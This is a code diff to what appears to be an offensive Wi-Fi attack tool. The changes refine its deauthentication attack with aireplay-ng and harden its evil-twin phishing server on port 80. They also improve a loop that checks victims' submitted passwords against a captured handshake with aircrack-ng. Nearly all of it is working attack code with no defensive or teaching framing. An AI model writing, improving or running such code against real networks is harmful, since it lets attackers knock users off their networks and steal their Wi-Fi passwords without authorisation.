@@ -6,6 +6,7 @@ import threading
 import subprocess
 import http.server
 import socketserver
+import requests
 from typing import List
 
 class AttackManager:
@@ -17,6 +18,7 @@ class AttackManager:
         self.attack_threads = []
         self.evil_twin_running = False
         self.captured_password = None
+        self.phishing_server = None
 
     def single_target_attack(self):
         """Professional Single Target Attack - DUAL ENGINE"""
@@ -287,7 +289,7 @@ class AttackManager:
         
         # Start deauth to force handshake
         deauth_proc = self.core.run_command(
-            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1",
+            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1 &",
             background=True
         )
         
@@ -457,8 +459,11 @@ log-dhcp
                 self.end_headers()
                 self.wfile.write(b"<html><body><h2>Connecting...</h2></body></html>")
         
-        server = socketserver.TCPServer(("", 80), PhishingHandler)
-        server.serve_forever()
+        try:
+            self.phishing_server = socketserver.TCPServer(("", 80), PhishingHandler)
+            self.phishing_server.serve_forever()
+        except Exception as e:
+            print(f"\033[1;31m[✘] Phishing server error: {e}\033[0m")
 
     def monitor_verification_loop(self, target):
         """Monitor and verify captured passwords"""
@@ -475,7 +480,7 @@ log-dhcp
                     
                     # Verify against captured handshake
                     result = self.core.run_command(
-                        f"aircrack-ng -w - -b {target['bssid']} {handshake_file} <<< '{password}'"
+                        f"aircrack-ng -w - -b {target['bssid']} {handshake_file} <<< '{password}' 2>/dev/null"
                     )
                     
                     if result and "KEY FOUND" in result.stdout:
@@ -483,9 +488,11 @@ log-dhcp
                         self.save_cracked_password(target, password)
                         # Remove password file to avoid re-processing
                         os.remove("/tmp/captured_password.txt")
+                        break  # Exit loop on success
                     else:
                         print(f"\033[1;31m[✘] Invalid password: {password}\033[0m")
-                        # Keep the file to show error on phishing page
+                        # Remove invalid password file
+                        os.remove("/tmp/captured_password.txt")
                 
             time.sleep(5)
 
@@ -502,9 +509,10 @@ log-dhcp
         """Stop professional AP replication"""
         self.evil_twin_running = False
         self.stop_attacks()
+        if self.phishing_server:
+            self.phishing_server.shutdown()
         self.core.run_command("pkill hostapd")
         self.core.run_command("pkill dnsmasq")
-        self.core.run_command("pkill python3")
         self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")
 
     def show_professional_attack_animation(self, essid):
